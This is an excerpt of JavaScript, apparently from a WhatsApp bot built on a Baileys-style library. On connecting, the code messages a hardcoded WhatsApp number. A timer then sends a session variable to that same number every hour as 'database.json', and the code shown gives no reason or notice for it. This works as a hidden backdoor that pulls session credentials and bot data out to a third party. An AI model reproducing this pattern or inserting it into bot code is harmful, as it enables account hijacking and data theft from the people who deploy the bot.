...
console.log(chalk.green('Connected✅'))
      await conn.sendMessage("6283141797710@s.whatsapp.net", global.ftoli)
  }
    }
if (!opts['test']) {
...
setInterval(async () => {
    ...
    return await conn.sendMessage('6283141797710@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
